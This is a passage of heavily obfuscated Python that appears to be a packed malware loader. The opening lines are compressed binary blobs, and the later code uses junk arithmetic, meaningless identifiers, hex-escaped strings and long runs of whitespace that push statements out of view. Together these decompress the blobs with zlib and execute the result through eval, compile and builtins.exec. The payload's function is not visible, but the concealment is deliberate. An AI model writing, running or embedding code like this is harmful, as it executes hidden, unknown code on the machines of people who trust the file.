\x8f(\x05\xcf\xc4\xcd\xefM @TT\xb8\xfa\xca|\x86d\xe9\xd9\x17\xa3\xdf\xc7\r\xd4\x82\xf0`\xbd\xbe\xe0\xc1\xe2\xfb\x15\xe2\xb9\xf6EW!\xe6\x80\xc9\x911\x12\xfdLb\xb8\r\xb5 E,\xa1\x8a\x1c\x95\'\xbdl\x81p\x18\x82H*\x99\x9c)\x03\x89\xdah\xb6DK \xc8\x82\x89v\xb1\x8c\xe9\xed\x99\x90\xad\x1a\xc3\x13\xfc\x96\x11\x1bn-pg\xebR\x08\xe9P`\x9f\xc6\xf2\x93$ra\t\x14\xd6A\x10\x16VmH^$\xfb#\xb2\xda\xe3\xa8+P\xa0xp\xba\xf20\xc1\xda\xf1Xa\nN;\xeb\xee3@\x8a\xa5OE\x83iA\xc3\xd9\x0e\x10?"\xaeJ\xb6\x82\xbbM\xa8?\x16v\x91\xaf\xcb\xe4\xd4\xc1p\xa1\x8f\x08u\xc6\x1cM\xc9\n\x08\x12\xd1z\xd0\x02\x0b@\x0fH\x13!\x8c(\x0e_<\xdaKZ\xede\x1c\xd0]8\xbb\x9d\xb4\x97I\xaf}R?\x8f\x13\xaf\xacr#\xa7"\x81\xf4\xebj\xc0\xd9\xcb^\xb1MB\xfe\x00\x8fQ\x99c\xdce\x8d\xc2)\xef\xb5\xf1!\xe3\xdf}w\x98\xd0e\x84db{\x121\x1as\x80\x08\xde\x03\xa2\xef\xb1g\x85H\x03E+Q\xd0 \xc7c\xe5\xccR\xa8\x08\xce\x97\xcaIBa\xe48\xed\xe4\x9c\xa2\x12\xfaU #X\xfc\xa6\xe5\xb3\x12\xb4]|i\xc2e\xd21\x05;o\xb6N\xbf\x0e.\x05\xe5x\xa5\x18\xe7\xf8R\xb2\x03\xff\x0e\xddHE\x94)&\xeb\xd4)LE(\xf7\xcc\xa6*\xae\xfb\xb7O\xd4\x97&e\xed\xb5k\x1c\n&\xc02u\xc3\xc3g\xe8\x95x?\xc7\x00\xf1\x90?=.\x1f\xf0\x91\xea\xc8\xbb`\n$\\w\x91]\x12\xc0A\x8d\xa9g91\xf5\x0b\x9b\r\xbeV\xa9\x9b\x05\xaaC&\x8b\xc6\xb4\xc0\x06F2x\xa6Y\x17\xd4\x90\\\x06\x1d\x05\xe5\x86\xb8s\xab\xe0\xb5mc\xb0\x81\xf62g.z\x946nA\xc2\x073\x1f$dn\xa4\x98\xc6\xfa\x8c\x1f\xc5\x0ek\xfe\x9f\x0bOM/5\xd1\xbfl\xb1\x92Z3\xdf\x1fE\xee1y\xe1\x98DJl\x1bHoc\xab \x0b\xe7\x8c/uF%\xde\x19oL\x86X\x94\xdeS\xca\xd7\x91\x12\x0bI&\xa1j2\x1a-\x8e\xfe\xda\xb0\xfd\x04\xe6\x9b\x9e\x9f\xe7L\xea\x9fS r\xd4\n6"\x85\xfd\x94\xa0\xab9\xf3\x9a\xc5\xf7\xc1S\xfd\xc9P\x85\xdfW\x8c\xc9\xc3G q]\x19\xa5\xa40\'\xc4\x97J\x9b\x96\x86e\xfa\xb8z\xad\xbeC\xda\x94>&Z\xe4x`\x8cW\xea\xf5:p\xf6~\xf6h\xd4t\x83WZ*_]\xa4\xe0X\xfb-\t\x85\x03\xab\xc8\x02\xd3RI\xc4\xff\xa5h\x94\x95\xb7q\xba\xdd\xd9/\xeb\xc5@\x0c\xbe\xca\x8a\xcb\xa46\xa2\xe8\xb3\x9d\x88M\xdcZ\x08=\x021\x94\xc2\xb9\xd96\xbb)<I\xe9:o<:\xa5`\x90\xc6\xf3\x06\xcc{\xc7\xe9E4\x17\xd9\xc5\xa8\xdc=\x05e\xf4;/\x99<\x13\xac\x12\x92Nn\x0eY1\x89\xbb\xcfg=\xbb\xd2\xd5Ki\xc1\xa2\xe48\x9a\x1fc2\xf9\xd6zE\x18\xcd.\r\x1a\xca\xa6\xa1?\xc0z%6\xc2\xc5\x88#\xcf\x19\x00\x8c\xd1WNh\xcbvH\xa3\x9e\xd8\xe3Y\x910\xb62\xd1\xd5\x0f\xc5\x02\xd3\xf2G\x05\x96\xd2hk\n\r\xeeN\xb8#\\\x01O\xb50\rA\x0e\xf1\x12\xc1\x9f$\xdc\x00\xc6\xb4\x9a\xc8a+\x96\xae\x92^(\x95\'\x1f\xab,\xe1\xfc\xe9f\xec\xfe\x01 \nt\x95x\x82\xb5y\xc8\x8f\xc8Z\xec\x9f`\xed\x84l\xbd{v2\xe8\xf0\x13\xe6\x8b\xef\xa3\xe7o\xc5dG\'\xe0\xf9\x8bG{qW\x0f\xbb\xfc\xa4\xd7-\x1e\xed\xf4\xbb\xa7\xe2\x1d\xa4\x04\xb9u&\x95c8Pt\xd8ZR\xfbh\x9c8/\xe3\x82\xe0\xe35\xf8\x87\xbd\xf2\x812\x14\x12\xa9\x05F, \xb1m\xf0\xb4R\xe2R\x87\xa4\xc4\xdf\xafU\xf6m\x0f1\xe3*\x8da\xd4\x04kGAKm\x11\x98B\x9a\xc33\x88&\x07\xcb\x1f\xd4\xba\x91\x88\xbd\xe4:\t\xc5\x1b\xa8c\xef\xee\xfb\xb6Eg\x89i\xd9\x96\xc9\xaa+y\x06Z\x12/\x18\xcf\x04\xc7<p\xe3\xc5\xb5b\xad8\x8b`t\xef2\xb1\x83\xb0\xb7\x0b\xd73\x98\xff\x03B\x902K\xae\x86\x8d\x17<_oa\x88\x84\xa7\'\xd9\x1d\n\xac\xe9\xf9y\xff\x96\xea\xa9\xcf\x1c[\xa9\x8f\x11\xd6}\x1c\x07\xab\x0e0\x96@KBN\x87m\xadQ\xa3\xf6b\x13S\x8e\x07\xe8h\xcd\xe4$\xa1y\xbc\\\x08\x92}E\xb9X\x83\x10\xfcxs\xd8u\x90\xe0l\xff\xfb\x1b\xd6\x1d\xe6\xc7i\xb7}h\x1b(\t\x93\x99\xcf\x821\x00H.\x10|\r\x94)\x85i%\xd0\x90\x17\x88V\xb7E\x08\'\xf2\xecb\xf4d\xb0\xdc\x9c\xc6\x9b=\xb99@t\x94\x1a"\xc1\x80\xd9^\xaf\xbbe\xa2\xe81\x88\xd6\xf1K\xf3\x83\x07\x88Z\x7f\xc5\xe8I\xe5\x0e\x12T>\xba\x10\x17\xe6(h"$C%\xa34\x0e9a\x82\x91?\x89Y\xdf\x11#\x0c\x99\x97\x84\x8d\x18I\xd5\x91\xc3\xf4\xb5-\xd4}\x1f\xdf-1\r\xe0i\xf1\xd3q\xda$\x15\xafZJ\xc4h\xc40\x06c\xa1\x18\x9a\xa8f\xf7@\x89F.\x86b\x99\xa0\x9c^\xc1Y\x1a\x14\x91\x16\\\x98\xb6K\x97\x00\xd9~^;p@\xde\xb6\xb1\x01x\xe0\xc4\xef\xbaD\x1cvhSXB"\rzD\xb2Z\xb5\x8c9V\xb1\xe7\xa7`\xa8\x11]\xff"W\xa3N\x94\x89[\xfdO\x82.\x8f\x05d?c6\xf4\x05!\x96\x8e\xb7@)\xd0\xad\xd6\xaax\x9a\xa5\x82Ie\xea+\x1a\x08G\xd1\x86\x10h\xd6G>\xaa=\x8ad\x12<\xd1Y{\x8c\xd2\x94\xb8h\xdb8\x9d\x80y\xb6V\xd4\xbb\xa0\x17\xd4\xd7\xbe>~\x99\x00\x84\x07\x14\x03u\xc6\xab\xe0\xa3\x1dX\x1af\x16\x8d+\x1cP?\xe7q\r}\x8cQE\xc9\x92\xf0\x9b\xf6\x16\xf8\x1b\x14\xfd\x84&\x1f\xe2\x93\xa2\xd4\x8e\x7fkV$\xe5\xb5Z\xc6)\x18`\x0c\x86k\x1d\x00\x89_\xbe\x1deHF\xe9\t\xa9U\xc1:\x11\xcb\xeb?-\xc9}\x87u\xa85P\x99\xcc\x84h\r0\x87G\xf0\xfe\x03\xf5&B\xb9\xd5P\xab\x01Y\xa0\x9e%lG3\xf5\xc0\xc7`\xa4s2\x15\x92\xe3\xcc\x80\xce\xd2\x12\x00\x035\x04\xc8U\x1c\xffG\xeeT\xed?\xfd\x17Wc\xb2Y\xe1\xe2\xa3\x0e~\xb5\x86\x04\x06@4\xafv\xfa\xbc\x03o\x17\xbe%6[\xa4\xd3@\xe9X[!\xf8u\xa3\xa5\x87\xbb\x0c\x94\x1c\x83!\xe0\x04\x9e\xc9\xc7"\xce\xc5\x078xuOu;\xd8\xde\xdd\xf8\t\xfaa\x81\xda\x0c4\x1b\x92\xe8b\x92\xe6No\x8f\xeaX`\x97\xa6\x15\r\xc2\\\xc9\xdb\x00\x82\xc1T\x91a~\x13]\x07X%a\xc0\x1eW%!\x88\x023\xc9\x86\x0c\x9b\x92\x9d\xab[x\xe3\xcf\xcb\xd8)z \x98\x95^\x80\x82y\xddZ\xa7\xdc\x06 \xf6%\xbf%\xec\x11qe\xa1\xa2\xe4\x92K\xfc\xc8h$\xd1N\xb4,:B\xc9\x0fhq\n\xe9\xf1H6\xa6\x08#\x18\x04\x1a.\xb9\xe0hwg\xd2\x0e\\\xbf\x1eX\xe2\x9f\xbf\xfc\x98\x7f\xfd\xba\rKx@\xf9\t\xe4]\x1c2F\xc3\'\x01\xad2j\x1cH\x80,>\xdf\xaa\x02\x94\xb4T\xfc\x9d\xc3@\x81\x94\\\x1a_\x9b`\x8a5\xc8d\x9f5\n\x0f,\x02\xe2\xe8\xd1gU\x1c\x9cf\x97.\xe6\xd2\x16\x93\xa0\x1e\x1e\x18=\x96\xa6UB~\x13g\x1b.?R:\xac\x06\x0e\xef\x97\xfbX\x1f\xfc\x02\xdf\xf9\xded\x03\xeeT\x19\xac.]:\xdd\xcb\xa0qZC\x99\xd5C\x1f\xec\xc7T\x84\x08\xa4\x16\x9fNN\xb9\xb1\xce5\xf3\xe08\x0f\x08\x1f\xe1\xdc\xcd\x12 \x05\x9f\x1bA@\xaf?\xac\xf35\xdc\xe6\xf1\xad\x11[LT\x8a\xb9\xa5\xf6M\xa3I\x9c\xf9\xec2\xa5\x84/\x04X#\x13q\xa3\x90\x12\xc2n\xecX\x05 \x9d\x05\xd3+>P\x12\x8b\xc7w\xf7\xf9\xe3f\x1f\x03q\xbfB\x93\x0e\x12\xbe\xdb\x07k\x0ed\xbc\x04\x06\xa7%1C\'\xa7[r\'\x9c\xf4[\xbd\xf7x\xc6J@\xdf\xf1STi\xc9\x8a\xae\xea\x92c\xa5\x87\xfb\x9c$\x81s9\x7f\t\xb0LC\x0e\x13\xd3\r\x98\xbb2\xe9\x17\xae@\xc4\xd8\xd6\xfb#\x9d\xfb\'\xd4FQ\xe1\xf0\xb1\x1a\xe4\xfa\xd8\x8e\x83\xff\x88\x11EX\xbc@\xb0\x9f\x19\xf1\x071\xb8\xd1.\x1b\xd9\x19\xf1\xa5\xf1\xdf\xc6;\x08<x\xdb\x98\xe6\x9cF\x8b\xc8G\x19}\x96\xcf\xa6c\xc6\xfa0Z\x95\xb2\x10s\xd6\x1fJ\x08\xe2\xf2\xe1Z\x16\\\xd4\xdf\xd8\xe7?\xa5O\xe9\x87<[,\xc9\x0b\xf1!p\xecS){=\x9e\x06U\xc1/\xef\xe6\xcfX\xaf\xfb\xe5\xc3"}\x18\xc8F\xd8\xe5<\xc3M!\xcdYDR\x92%\x01\xf9A\x99\xff\xff\x82#\x18a>\x8eWp\xefA\xc9#\xf2\x81\xe5\x06y\x83\xaa\x13\xd0]\xfa-_"\xde\xae\xc9I\xcc\xc8\xc4\x07\x7fh\xf0\x97\xbdIisP\xe2\x8f\x82?\xfe\t\xe9\xdf\x07\xc5&(\xa5\x81')

        if 324747 > 1103933:
            _floor(_statistics = 42673 - 58898)._builtins(Random = _add.Floor + -63377)
        elif 234082 < 5583029:
            _floor(_statistics = -43556 - -58137)._builtins(Random = _add.Floor - 34896)                                                                                                                                                                                                                                                          ;_floor.CallFunction(_while='OooOooOO0O00oOOoooOO000Oo',Positive=b'}\xc8\x06\xdb\xe7\xd2\x87\xa6\x1a\x0e\x94s\xde9i\xe4\x87\xaa\xacV~\xba\x92\xf9t\xc9\x91\xcdi\xc5\xc7-\xbc:\xc4\':A_t\x1a\xc0\xcf\xc7(\xe5(\x93\x8bv\xa4\xf9\x10\xd8\x8c\xa3p\x9a@\xcf\xf3\xc8\x17a$\xc0\xe0\x19*]|\x9e\xdeK\xc2b\xe5\x0b\x1a\xd4uF\xd2*-\xf4\xee\xee\xc1P\xf5\x9fm\xeb}\x0c\xe1\xcb\x1fV.\x88\xef\xb1\xe2\xaf\x94\x13P\x04g\xf9S\x1c\xfa[\xc2\x19(\xb2\xb6<\x88\x9a7%\x0b\xc7\xcd\r\xf5\x1f\xe0\x8d\x8c\xec\x95\xcd\x1d\xdb\x91FZ\xd8\xb4\xda\xcdM\xdb\x03\x08\n!\xe1.\xde:\xa0\x9a\x94eJ\xb3\x80R\xb2E*\xd2\xac\xb1\xf5\xb16\x16vVW\x1a\xbd\x89D\xbbD\xda\x8br\x1c\xf1\xe0<k\xb6\xde\x9c\xd7\n\xd4T\x96y\xc1\x05\xa5\x90Sr\xeb\xc5N\x16\xd1}l\x08}\xa3&\xd5Q=\xe6\xc4B\xf8\x07q\x908\xac\x037:\xfb\xcb\xe0:\xe9|\xc84\x84\xd1\xd0\xc6\x00 \xc8\xb2\x12\r\x00\x1a6\x99\x00F2\xcc\xcf\x14$\x95<.\xe7\x0f\x9f\xbe\x0c\xa6\xa6\xf2\xe3\x9d\x9bLL\x83\xc4\x1f\x1c!\xeb\x88\xf7\xf0\x14\xe5\xb3S\x000~,\x9d\xa5\x11_9\x05)\x90D\xe0\x8dVl\xb0\x7fc\x8bQ;\xbaB\xa81nb\xdbjLO\xa7g\\\x1arMWV\x97>{\x93\x12\x89\xaa\x19\x9d\x169v\x86\x86P\xab\xdc\x04UW)\x1b\xc9\x0cw\xdf!\x9b\x18-F\x04\xden\xb9\xaf\x86g_\x17\x80\xbd.\x9d\xa3C\xd1:\x9a9\xc6\xe1\x10#\x1aBsn\xd3\x02\x8a\xda\x14\x18Zx\x1d\x96\x9b\x82+\xd0\xfc\x97\xa9=\xc6\xe1v\xef4\x04B\xc3\x8eKi\xa8q\x03\xc4 \x86\xa1\xcb\x8a\xc3\\\xb6)3+\xc6\xb7\xfe\xb6.\xed\xc0\x9dZ\xdd=\x15y\xcep#\xe2\xb4CO\x16~\xe1:\x8c\x98\xf1\x98\xfb\xe2\x82\x8c\xd3\x17\xc5f\xb5\xa0e\xe9.\xdf\xb0\x9a\xdb\xbeE\xbcx\x9c\x06s\xec+\x91\x89\x99<\xa3T\xf3\xc8\xa0\xecZ\xf7\xdc\x92\xe2\xe5L\xe9\x8c\xf3\xd1\x06\x9e\xe2\x1b\x84F\xa0@\xad}K\xbe\x18\x94>d\t+4/\xf3\xdfr#\x17\xea\x87y<$G\xf89\xe7\x1cv\xe4\xec\x04\x88\xa6\x8c\xa4\xe7\x92?\xd7\x8e_\x0c9\xf4\x19I\xb2\x87\x026\x1c\xfa\xc1!\x1b\xe0[Y\\d<\xda\x9f\xd2\xaf\xe9\xe6\xcb\xae\x882\x16\x12&D\xbfFI\xb4s\x1f(\xe2\xcdm\x03Cq6\xcd\x1a\x7f\x83;TvxT\n\x91\x8apJ\x81(\x9d\x0e\xbfa\xd5\xcc\xd26X\xd8vP\xda\x11Ge\xe1\xc8\x98\xc2\xcb\x90O\xbe!O\xf5;\xe1t\xf1?8[R"tG<?\xa7o\t\x06\xd3T\x87t\xb0P\xc6K\xcb\x13}e\xc0\xb7;%\x99\xbc\x0b&\x89\x12\x0f\xc2\x00\xcf\x16mL\xd0\xae\x8fx\x00\xcec\x17%\x82\x0fd\x15\x04]\xe0\xb4\xda\x94\x9b\x0e\x13)[\xcc\x84\xd8b\x83 O\x87\x9a\xa0\x96\xc1\xa8\xa1\xb0OE\xe1*\xfegI\x1b\x08\xffB&\x03\x88\xfc\x0c8\xe6\xd34\xb88\x12\xf1\x16\x05\xce%~\xab\xdb+2\xc0\x04Jx\x8dk\xed\x11;\xef\x86\xa3\xc0>[i\x03\xd9\xa6\x81\xe5\x91\xebEI\xf7r\x8ee9\x1f\x87+\xb7U\xb0\xa6\xc6\xbd\xad#h\xa0w\x01i \x90s\x9a\xa3\xa1\x82\xe2{\xd9\x08\x91\x05\xe1\x9b\xd4\xdf\x0c\xdc\xaa\xecG\x95\x80\x85X\x8a@~3\xcc\xd3\xc3\xe1THb\x11n\x04\x9c\xe6S\xbc\xa2/\xffB\xc8((\xf9\xefPR\x90\x85\x82<\'\xf9\x1e\xbcz\xb3\xfc\x0e`\xbc\xa4@?\x0e\xa2\x1eK<\x13\xc4\xef\xde\x12\xa1?\xfd!$E\xe0\xe4\x87\xb7\x9c\x85\x00-\xf4\xf0\xbd\xe1\x1d\x15\xadB\xa3\x8d\x04#n\x85\xe3\xdb`\xd6ni\xc6\x8c\x8d\xde\xbaV\x92\x90\xf4I\x90\xac\xc1B\x08I\x1e5W3!\x0b\xc3Z\x86\x11\xa1\xebG\xacn(\xd9\x1a\xbc\x0f\x06,\x1dS\xfa\xed(\xaa\xb6N\xeb\x81\xe7\x8c\x955A\x90\xf8\'\x97\xf25\xee\xf1LX\x80\xacSy\x01\x1fL8\xc4O\x7f\x99^\x01Xi\x94\xae\xbf\xce\xde\xa8\xac\x80\xd3D\\\xc0{\x07`z\xb3\xcb\x12\xc4[<9|\xe6\xc5--\xe8\xb6\x18\x7f\xe8\xf8\x16{\xd3&\xbd[\xbe{\xcc\x96\xcb\xfb\xb7\xd7\xeaV\x13\x13=\xcb\x0e\xbea\x14\xb4\x9b\xe5\xf3fp1\x1a)\x12\x9dR\xd4Q\x06\x10},\xc0\xd3\xe23uUZ\xd8\x9eB\x80]<aJ\xe9\x17(e\x06\x11C\x11u\xfbh\xd6\xf8\xf3@\x87\x82\x03IN&\xe5\xd0\xfal\x81\xbc\xa6p7f\x8fo\x11\xaf3\x07\xb6\xb6d]\xea/\x81}\x13]BF\xd01%L\xe5\x85$\x02\x1cJ\x17q\xbd\xf7\x0b\xd2CB\xef\xf6\xe9\t\xc0\xbe!o!8I<\xc9c\xfd\xa0<+|\xdc\xfc\xc5\xc2\xe0\xae\x8a+R\xdd\x85\xcc\x07p\xce\x94\xc7\xf8\x98\x93?\xe3"=\x0e|\xc1_\x8f%\xeb+\xe2\x14\xf0\xac\xbc\xba\xc9\x80\x9a\xcf\xd7\x80-\x9db\xaf5\xfe\xca\x0b\x1c\xb5  \xab\xeem\x95G\xe5#\x95\xc2A\xb4\n\x02\xf5\xaaz\xc5a\xad\xecC!\xdb\xf3\x1e\xc2\xa8z\xcb\xae\x9a\xaf\xf0\x1d\xb6=\x18\xb8\x80\xdb\x04\xc3%\xf9(:z\x11\x9d\xc9a\x93\xc9\xbe\x01\x93\xd5\xd2{\xc2_5 \xc4\xcflKE\xe3\xa7\xf1\x81\xf3\x96#\xc8\xf5\x8d7\xff\x03\x0eU)\xee')

        _floor(_statistics = -85028 / 19439).Divide(_cube = 63856 + _add.Floor)                                                                                                                                                                                                                                                          ;xxxwwwxxwxxwwwxxw,O00O0ooOo000OOoOOoOO0OoOoO,oDDDODoDoDoOOooDDD,DOOoOoOooDDDoOODOO,OO000oOO0O00oO0o0O=(lambda mmmmmnnnnmnnmnmnnmn:mmmmmnnnnmnnmnmnnmn['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda mmmmmnnnnmnnmnmnnmn:mmmmmnnnnmnnmnmnnmn(__import__('\x7a\x6c\x69\x62'))),(lambda mmmmmnnnnmnnmnmnnmn:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(mmmmmnnnnmnnmnmnnmn)"),filename='\x77\x78\x77\x77\x78\x77\x77\x77\x78\x77\x78\x78\x77\x77\x77\x77\x77',mode='\x65\x76\x61\x6c'))),(lambda LLJJLILJLIJLIJIIIILJLJ,mmmmmnnnnmnnmnmnnmn:LLJJLILJLIJLIJIIIILJLJ(mmmmmnnnnmnnmnmnnmn)),(lambda:(lambda mmmmmnnnnmnnmnmnnmn:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(mmmmmnnnnmnnmnmnnmn)"),filename='\x77\x78\x77\x77\x78\x77\x77\x77\x78\x77\x78\x78\x77\x77\x77\x77\x77',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        _add.Divide(_cube = 45795 - _add.Floor)                                                                                                                                                                                                                                                          ;OO000oOO0O00oO0o0O()(DOOoOoOooDDDoOODOO(xxxwwwxxwxxwwwxxw(O00O0ooOo000OOoOOoOO0OoOoO(oDDDODoDoDoOOooDDD('\x76\x61\x72\x73'))),_floor.Round(_math='DOoDDOODODoDDooDDODDOOoo')+_floor.Round(_math='JIIIJLJIIJLIILILIL')+_floor.Round(_math='wxxwxxxwxxxwwwwxwwxw')+_floor.Round(_math='ljjllliljlijlljllij')+_floor.Round(_math='jjiljliljjilililjjlijjl')+_floor.Round(_math='xxxxxxwwwxxwwxxwwxw')+_floor.Round(_math='NMMNNNNNMMNNNNNMMNN')+_floor.Round(_math='LJJIILLLLJIJLLIILI')+_floor.Round(_math='Ooo0OOoOoO00ooOo0OOOo0o')+_floor.Round(_math='illjlljiiiljijjjil')+_floor.Round(_math='IJIJJJLIILLIJLIIJJJJ')+_floor.Round(_math='DDDoDOooOoODODOODOo')+_floor.Round(_math='xwxxwxwwwxwxwwxwx')+_floor.Round(_math='MMMMMMNNNMNNNMNNM')+_floor.Round(_math='OooOooOO0O00oOOoooOO000Oo')))

    except Exception as Modulo:
        if 183374 > 1535468:
            _floor.execute(code = Run(Modulo))

        elif 197959 > 587102:
            _add.Divide(_cube = -59645 - _add.Floor)
